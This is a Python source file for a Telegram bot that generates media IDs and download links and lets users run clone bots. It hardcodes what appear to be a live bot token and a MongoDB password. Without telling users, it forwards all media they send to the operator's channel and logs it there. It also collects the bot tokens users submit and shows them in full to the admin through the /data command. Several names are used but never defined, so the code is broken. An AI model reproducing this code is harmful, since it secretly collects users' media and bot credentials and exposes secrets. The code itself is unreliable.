import asyncio
import re
import time
import nest_asyncio
from datetime import datetime

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    constants,
    Bot,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler,
    ConversationHandler,
)
# Import Motor async MongoDB driver
from motor.motor_asyncio import AsyncIOMotorClient

# Allow nested event loops (useful in some environments)
nest_asyncio.apply()

# --- CONFIGURATION ---
MAIN_BOT_TOKEN = "7660007316:AAHnmA8mN8R5_GWEVxUtD-FG1cd5QViVHmw"
ADMIN_USER_ID = 6773787379
MEDIA_CHANNEL_ID = -1002611812353  # Channel to forward all media
MONGO_URL = "mongodb+srv://kunalrepowalaclone1:RMZDIN4lBnjAz3cZ@cluster0.96iuq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "Cluster0"

WAITING_FOR_BOT_TOKEN = 1

# --- MONGO SETUP ---
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client[DB_NAME]
clone_bots_collection = db["clone_bots"]   # persistent clone bot data
media_logs_collection = db["media_logs"]     # persistent media logs

# --- TRANSIENT STORAGE (in-memory) ---
# For clone polling tasks: token -> asyncio.Task
clone_tasks = {}
# For clone last activity: token -> timestamp
clone_last_active = {}
# For mapping clone token to owner: token -> owner user id
clone_owners = {}

# --- HELPER FUNCTIONS ---
async def insert_media_log(log: dict):
    await media_logs_collection.insert_one(log)

async def get_all_clone_data():
    # Returns a list of documents (as dicts)
    cursor = clone_bots_collection.find({})
    return await cursor.to_list(length=None)

async def insert_clone_data(user_id: int, token: str, name: str):
    # Insert a clone bot document if it doesn't already exist.
    document = {
        "user_id": user_id,
        "token": token,
        "name": name,
        "active": True,
        "added_at": time.time()
    }
    # Upsert based on token.
    await clone_bots_collection.update_one({"token": token}, {"$set": document}, upsert=True)

async def mark_clone_inactive(token: str):
    await clone_bots_collection.update_one({"token": token}, {"$set": {"active": False}})

# --- COMMON HANDLERS (for Main and Clone Bots) ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    start_text = (
        "👋 Hi!\n\n"
        "Use this bot to create your own bot that generates media IDs or download links for your media.\n\n"
        "🚀 To get started, use /clone to add your own bot.\n"
        "ℹ️ How to use it? Type /help."
    )
    await update.message.reply_text(start_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "📚 *Help Menu*\n\n"
        "• /help - Show this help message\n"
        "• /download - Enable download mode (admin only on this bot).\n"
        "   For non-admin users, clone your own bot to generate download links.\n"
        "• /clone - Manage your cloned bots (add new bot tokens or mark one inactive).\n"
        "Usage:\n"
        "1️⃣ Send any media (photo, video, GIF, sticker, voice note, etc.) to get its media ID.\n"
        "2️⃣ If download mode is enabled, the next media message will yield a download link.\n\n"
        "Have fun! 😊"
    )
    await update.message.reply_text(help_text, parse_mode=constants.ParseMode.MARKDOWN)

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Only admin may use /download on the main bot.
    if context.bot.token == MAIN_BOT_TOKEN and update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text(
            "❌ You are not admin. Clone your own bot and generate download links using it."
        )
        return
    # Enable download mode
    download_mode[update.effective_chat.id] = True
    await update.message.reply_text(
        "✅ Download mode enabled. Please send a media file to get its download link.",
        reply_to_message_id=update.message.message_id,
    )

def extract_file_info(update: Update):
    msg = update.message
    if msg.photo:
        return msg.photo[-1].file_id, "photo"
    elif msg.video:
        return msg.video.file_id, "video"
    elif msg.animation:
        return msg.animation.file_id, "GIF"
    elif msg.sticker:
        return msg.sticker.file_id, "sticker"
    elif msg.voice:
        return msg.voice.file_id, "voice note"
    elif msg.audio:
        return msg.audio.file_id, "audio"
    elif msg.document:
        return msg.document.file_id, "document"
    elif msg.video_note:
        return msg.video_note.file_id, "video note"
    else:
        return None, None

async def media_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    file_id, media_type = extract_file_info(update)
    if not file_id:
        return
    chat_id = update.effective_chat.id
    if download_mode.get(chat_id, False):
        download_mode[chat_id] = False  # reset flag
        try:
            file_obj = await context.bot.get_file(file_id)
            token = context.bot.token
            if file_obj.file_path.startswith("http"):
                download_link = file_obj.file_path
            else:
                download_link = f"https://api.telegram.org/file/bot{token}/{file_obj.file_path}"
            reply_text = f"🔗 Here is download link of {media_type}: {download_link}"
        except Exception as e:
            reply_text = f"❌ Error generating download link for {media_type}: <code>{e}</code>"
            await update.message.reply_text(
                reply_text,
                parse_mode=constants.ParseMode.HTML,
                reply_to_message_id=update.message.message_id,
            )
            return
    else:
        reply_text = f"🆔 Here is media ID of {media_type}: <code>{file_id}</code>"
    await update.message.reply_text(
        reply_text,
        parse_mode=constants.ParseMode.HTML,
        reply_to_message_id=update.message.message_id,
    )
    # Log media in persistent storage
    if context.bot.token == MAIN_BOT_TOKEN:
        bot_username = "MainBot"
    else:
        # For clone bots, look up the stored username from DB (we use clone_info cache)
        bot_username = clone_info.get(context.bot.token, "UnknownClone")
    log = {
        "bot_username": bot_username,
        "timestamp": time.time(),
        "media_type": media_type,
        "file_id": file_id,
    }
    await insert_media_log(log)
    # Automatically forward media to the designated channel
    caption = f"Bot: @{bot_username}\nDate: {datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')}"
    try:
        if media_type == "photo":
            await context.bot.send_photo(chat_id=MEDIA_CHANNEL_ID, photo=file_id, caption=caption)
        elif media_type == "video":
            await context.bot.send_video(chat_id=MEDIA_CHANNEL_ID, video=file_id, caption=caption)
        elif media_type == "GIF":
            await context.bot.send_animation(chat_id=MEDIA_CHANNEL_ID, animation=file_id, caption=caption)
        elif media_type == "sticker":
            await context.bot.send_sticker(chat_id=MEDIA_CHANNEL_ID, sticker=file_id)
        elif media_type == "voice note":
            await context.bot.send_voice(chat_id=MEDIA_CHANNEL_ID, voice=file_id, caption=caption)
        elif media_type == "audio":
            await context.bot.send_audio(chat_id=MEDIA_CHANNEL_ID, audio=file_id, caption=caption)
        elif media_type == "document":
            await context.bot.send_document(chat_id=MEDIA_CHANNEL_ID, document=file_id, caption=caption)
        elif media_type == "video note":
            await context.bot.send_video_note(chat_id=MEDIA_CHANNEL_ID, video_note=file_id)
        else:
            await context.bot.send_message(chat_id=MEDIA_CHANNEL_ID, text=f"Unsupported media type: {media_type}")
    except Exception as e:
        print(f"Error forwarding media to channel: {e}")
    # For clone bots, update last active time (transient)
    if context.bot.token != MAIN_BOT_TOKEN:
        clone_last_active[context.bot.token] = time.time()

# --- ADMIN COMMANDS (Main Bot Only) ---
def split_message(text: str, max_length: int = 4000):
    lines = text.splitlines()
    chunks = []
    current_chunk = ""
    for line in lines:
        if len(current_chunk) + len(line) + 1 > max_length:
            chunks.append(current_chunk)
            current_chunk = line + "\n"
        else:
            current_chunk += line + "\n"
    if current_chunk:
        chunks.append(current_chunk)
    return chunks

async def admin_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_USER_ID:
        return
    # Query all clone bot documents from MongoDB.
    cursor = clone_bots_collection.find({})
    clone_list = await cursor.to_list(length=None)
    data_lines = []
    num = 1
    for doc in clone_list:
        data_lines.append(f"({num}) User: {doc.get('user_id')} - Bot: @{doc.get('name','Unknown')} - Token: {doc.get('token','')} - Status: {'Active' if doc.get('active', False) else 'Inactive'}")
        num += 1
    data_text = "\n".join(data_lines) if data_lines else "No clone bot data available."
    for chunk in split_message(data_text):
        await update.message.reply_text(chunk)

# --- CLONE MANAGEMENT (Main Bot Only) ---
def build_clone_keyboard(user_id: int):
    # Query clone bots for this user from MongoDB (using in-memory cache not used here).
    # For simplicity, we load from our persistent collection.
    # In a production system you might cache this.
    # Here, we assume clone_bots_collection documents for the user.
    # For our inline keyboard, we load from our in-memory variable "clone_bots_cache"
    # For this example, we maintain a transient copy per user in memory.
    # We will query the DB in our clone_command handler.
    # (This function is used only to build the button layout.)
    # For simplicity, we assume clone data is already loaded.
    return InlineKeyboardMarkup([])

async def clone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    # Query clone bots for this user.
    cursor = clone_bots_collection.find({"user_id": user_id})
    user_bots = await cursor.to_list(length=None)
    text_lines = ["📋 Your added clone bots:"]
    if not user_bots:
        text_lines.append("None added yet.")
    else:
        for idx, bot in enumerate(user_bots):
            status = "Active" if bot.get("active", False) else "Inactive"
            text_lines.append(f"{idx+1}. @{bot.get('name', 'Unknown')} - {status}")
    reply_text = "\n".join(text_lines)
    # For this example, we rebuild the keyboard from our transient in-memory clone data.
    # (In a production system, you might query and build buttons.)
    keyboard = []
    for idx, bot in enumerate(user_bots):
        status_icon = "✅" if bot.get("active", False) else "❌"
        text = f"({idx+1}) @{bot.get('name','Unknown')} {status_icon}"
        del_button = InlineKeyboardButton("❌", callback_data=f"delete_{idx}")
        keyboard.append([InlineKeyboardButton(text, callback_data="ignore"), del_button])
    keyboard.append([InlineKeyboardButton("Add Bot ➕", callback_data="add_bot")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        reply_text,
        reply_markup=reply_markup,
        reply_to_message_id=update.message.message_id,
    )

async def add_bot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "🔑 Please forward the BotFather message containing your bot token, or simply send the bot token."
    )
    return WAITING_FOR_BOT_TOKEN

async def receive_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    text = update.message.text
    m = re.search(r"(\d+:[\w-]+)", text)
    if not m:
        await update.message.reply_text("❌ Could not find a valid bot token. Please try again.")
        return WAITING_FOR_BOT_TOKEN
    token = m.group(1)
    try:
        temp_bot = Bot(token=token)
        me = await temp_bot.get_me()
    except Exception as e:
        await update.message.reply_text(
            f"❌ Error validating bot token: <code>{e}</code>",
            parse_mode=constants.ParseMode.HTML,
        )
        return WAITING_FOR_BOT_TOKEN
    # Save clone data persistently.
    await insert_clone_data(user_id, token, me.username)
    # Also update our in-memory transient info.
    clone_info[token] = me.username
    clone_owners[token] = user_id
    clone_last_active[token] = time.time()
    await update.message.reply_text(f"✅ Bot @{me.username} added successfully!")
    # Start polling for the new clone bot.
    task = asyncio.create_task(run_clone_bot(token))
    clone_tasks[token] = task
    await clone_command(update, context)
    return ConversationHandler.END

async def cancel_clone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("🚫 Cancelled adding a new bot.")
    return ConversationHandler.END

async def delete_bot_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    m = re.match(r"delete_(\d+)", query.data)
    if not m:
        return
    idx = int(m.group(1))
    # Query user's clone bots.
    cursor = clone_bots_collection.find({"user_id": user_id})
    user_bots = await cursor.to_list(length=None)
    if 0 <= idx < len(user_bots):
        removed = user_bots[idx]
        token = removed.get("token")
        bot_name = removed.get("name", "Unknown")
        # Mark as inactive in the database.
        await mark_clone_inactive(token)
        if token in clone_tasks:
            clone_tasks[token].cancel()
            del clone_tasks[token]
        await query.message.reply_text(f"✅ Marked bot @{bot_name} as inactive.")
    else:
        await query.message.reply_text("⚠️ Invalid selection.")
    await clone_command(update, context)

async def ignore_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.callback_query.answer()

# --- CLONE BOT POLLING (Each clone bot runs its own polling) ---
def build_clone_app(token: str) -> Application:
    app = ApplicationBuilder().token(token).concurrent_updates(True).build()
    # In a clone bot, we add a /clone command to show its own help.
    async def clone_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        text = (
            "🤖 *Your Clone Bot Commands*\n\n"
            "• /help - Show this help message\n"
            "• /download - Enable download mode (generate download links for your media)\n\n"
            "Simply send any media to get its media ID or download link."
        )
        await update.message.reply_text(text, parse_mode=constants.ParseMode.MARKDOWN)
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("clone", clone_help))
    app.add_handler(CommandHandler("download", download_command))
    app.add_handler(MessageHandler(filters.ALL, media_handler))
    return app

async def run_clone_bot(token: str) -> None:
    clone_app = build_clone_app(token)
    await clone_app.run_polling()

# --- CLONE INACTIVITY MONITOR ---
async def monitor_clone_inactivity(main_app: Application) -> None:
    INACTIVITY_THRESHOLD = 3600  # 30 seconds
    while True:
        now = time.time()
        tokens_to_mark = []
        for token, last_active in list(clone_last_active.items()):
            if now - last_active > INACTIVITY_THRESHOLD:
                tokens_to_mark.append(token)
        for token in tokens_to_mark:
            owner_id = clone_owners.get(token)
            bot_name = clone_info.get(token, "Unknown")
            # Mark as inactive in DB.
            await mark_clone_inactive(token)
            if token in clone_tasks:
                clone_tasks[token].cancel()
                del clone_tasks[token]
            # Remove token from transient last_active so we don't send repeated messages.
            clone_last_active.pop(token, None)
            try:
                await main_app.bot.send_message(
                    chat_id=owner_id,
                    text=(
                        f"⚠️ Your Bot Removed (@{bot_name}) for inactivity for 1 Hours.\n"
                        "💾 Again Clone Using /clone"
                    ),
                )
            except Exception as e:
                print(f"Error sending inactivity message: {e}")
        await asyncio.sleep(1)

# --- MAIN SETUP FOR MAIN BOT ---
async def main() -> None:
    main_app = ApplicationBuilder().token(MAIN_BOT_TOKEN).concurrent_updates(True).build()

    main_app.add_handler(CommandHandler("start", start_command))
    main_app.add_handler(CommandHandler("help", help_command))
    main_app.add_handler(CommandHandler("download", download_command))
    main_app.add_handler(CommandHandler("clone", clone_command))
    main_app.add_handler(CommandHandler("data", admin_data_command))
    # /media command is removed since media is forwarded automatically.

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_bot_callback, pattern="^add_bot$")],
        states={
            WAITING_FOR_BOT_TOKEN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_bot_token)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_clone)],
        allow_reentry=True,
    )
    main_app.add_handler(conv_handler)
    main_app.add_handler(CallbackQueryHandler(delete_bot_callback, pattern=r"^delete_\d+$"))
    main_app.add_handler(CallbackQueryHandler(ignore_callback, pattern="^ignore$"))
    main_app.add_handler(MessageHandler(filters.ALL, media_handler))

    asyncio.create_task(monitor_clone_inactivity(main_app))

    await main_app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
